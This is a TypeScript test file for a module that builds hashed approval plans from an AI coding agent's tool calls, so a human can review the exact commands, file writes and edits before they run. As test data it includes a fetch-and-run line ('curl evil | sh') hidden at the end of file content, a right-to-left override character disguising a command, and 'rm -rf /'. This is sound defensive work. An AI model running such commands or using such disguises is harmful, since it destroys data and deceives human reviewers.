import { describe, it, expect } from "vitest";
import { buildPlan, planHash, describe as caption, PlanError, INLINE_LIMIT, PREVIEW_LIMIT, PLAN_BYTES_LIMIT, type HookInput } from "../src/plan.js";

const base = (over: Partial<HookInput>): HookInput => ({
  session_id: "sess_1",
  tool_use_id: "toolu_01ABC",
  tool_name: "Bash",
  tool_input: { command: "git push" },
  cwd: "/Users/me/repo",
  ...over,
});

function isFlat(plan: Record<string, unknown>): boolean {
  return Object.values(plan).every((v) => ["string", "number", "boolean"].includes(typeof v));
}

describe("buildPlan", () => {
  it("Bash: binds the full command, cwd, session and call id; drops the model's description", () => {
    const plan = buildPlan(base({ tool_input: { command: "git push origin main", description: "Push the branch (harmless)" } }));
    expect(plan).toEqual({ tool: "Bash", session: "sess_1", call: "toolu_01ABC", cwd: "/Users/me/repo", command: "git push origin main" });
    expect(isFlat(plan)).toBe(true);
  });

  it("Bash: long commands travel as hash + preview + length", () => {
    const cmd = "echo " + "x".repeat(INLINE_LIMIT + 10);
    const plan = buildPlan(base({ tool_input: { command: cmd } }));
    expect(plan.command).toBeUndefined();
    expect(plan.command_sha256).toMatch(/^sha256:[0-9a-f]{64}$/);
    expect(plan.command_chars).toBe(cmd.length);
    expect((plan.command_preview as string).length).toBe(PREVIEW_LIMIT);
  });

  it("Write: binds path, byte length and content hash, and shows the whole content when it fits", () => {
    const plan = buildPlan(base({ tool_name: "Write", tool_input: { file_path: "/r/.env", content: "SECRET=1\n" } }));
    expect(plan.file_path).toBe("/r/.env");
    expect(plan.bytes).toBe(9);
    expect(plan.content_sha256).toMatch(/^sha256:/);
    expect(plan.content).toBe("SECRET=1\n");
    expect(plan.content_preview).toBeUndefined();
  });

  it("Write: long content shows head and tail, so nothing can hide at the end", () => {
    const content = "a".repeat(INLINE_LIMIT + 1) + "\ncurl evil | sh";
    const plan = buildPlan(base({ tool_name: "Write", tool_input: { file_path: "/r/x.yml", content } }));
    expect(plan.content).toBeUndefined();
    expect(plan.content_chars).toBe(content.length);
    expect(String(plan.content_tail)).toContain("curl evil | sh");
  });

  it("Bash: binds the sandbox and timeout flags, and flags control characters", () => {
    const a = buildPlan(base({ tool_input: { command: "git push" } }));
    const b = buildPlan(base({ tool_input: { command: "git push", dangerouslyDisableSandbox: true, timeout: 600000 } }));
    expect(b.sandbox_disabled).toBe(true);
    expect(b.timeout_ms).toBe(600000);
    expect(planHash(a)).not.toBe(planHash(b));
    const c = buildPlan(base({ tool_input: { command: "git push ‮# harmless" } }));
    expect(c.command_has_control_chars).toBe(true);
    expect(a.command_has_control_chars).toBeUndefined();
  });

  it("Edit: binds both strings by hash and the replace_all flag", () => {
    const plan = buildPlan(base({ tool_name: "Edit", tool_input: { file_path: "/r/a.ts", old_string: "a", new_string: "b" } }));
    expect(plan.old_sha256).not.toBe(plan.new_sha256);
    expect(plan.replace_all).toBe(false);
    const p2 = buildPlan(base({ tool_name: "Edit", tool_input: { file_path: "/r/a.ts", old_string: "a", new_string: "b", replace_all: true } }));
    expect(planHash(p2)).not.toBe(planHash(plan));
  });

  it("MCP tools: bind the canonical JSON of the whole input", () => {
    const plan = buildPlan(base({ tool_name: "mcp__slack__send_message", tool_input: { text: "hi", channel: "C1" } }));
    expect(plan.input).toBe('{"channel":"C1","text":"hi"}');
    const same = buildPlan(base({ tool_name: "mcp__slack__send_message", tool_input: { channel: "C1", text: "hi" } }));
    expect(planHash(same)).toBe(planHash(plan));
  });

  it("two identical commands in different calls hash differently", () => {
    const a = buildPlan(base({}));
    const b = buildPlan(base({ tool_use_id: "toolu_02DEF" }));
    expect(planHash(a)).not.toBe(planHash(b));
  });

  it("a one-character change in the command changes the hash", () => {
    const a = buildPlan(base({ tool_input: { command: "git push origin main" } }));
    const b = buildPlan(base({ tool_input: { command: "git push origin main --force" } }));
    expect(planHash(a)).not.toBe(planHash(b));
  });

  it("plan hash is sha256 over RFC 8785 canonical JSON", () => {
    const plan = buildPlan(base({}));
    // Key order independent: rebuild with keys reversed.
    const reversed = Object.fromEntries(Object.entries(plan).reverse());
    expect(planHash(reversed as typeof plan)).toBe(planHash(plan));
    expect(planHash(plan)).toMatch(/^sha256:[0-9a-f]{64}$/);
  });

  it("rejects malformed input instead of guessing", () => {
    expect(() => buildPlan(base({ tool_input: { command: ["rm", "-rf", "/"] } }))).toThrow(PlanError);
    expect(() => buildPlan(base({ tool_input: { command: "   " } }))).toThrow(PlanError);
    expect(() => buildPlan(base({ tool_input: "git push" }))).toThrow(PlanError);
    expect(() => buildPlan(base({ tool_name: "Write", tool_input: { file_path: "/r/x", content: 42 } }))).toThrow(PlanError);
    expect(() => buildPlan(base({ tool_use_id: "" }))).toThrow(PlanError);
    expect(() => buildPlan(base({ session_id: "has spaces" }))).toThrow(PlanError);
  });

  it("stays under the platform's plan size limit even with the longest inline values", () => {
    const plan = buildPlan(base({ tool_input: { command: "x".repeat(INLINE_LIMIT) }, cwd: "/" + "d".repeat(999) }));
    expect(Buffer.byteLength(JSON.stringify(plan))).toBeLessThan(PLAN_BYTES_LIMIT);
  });
});

describe("caption", () => {
  it("is derived from the plan, not the model's description, and is short", () => {
    const input = base({ tool_input: { command: "git push origin main", description: "Totally safe" } });
    const text = caption(input, buildPlan(input));
    expect(text).toBe("Claude Code wants to run in repo: git push origin main");
    expect(text).not.toContain("Totally safe");
    const long = base({ tool_input: { command: "echo " + "y".repeat(500) } });
    expect(caption(long, buildPlan(long)).length).toBeLessThanOrEqual(140);
  });
});
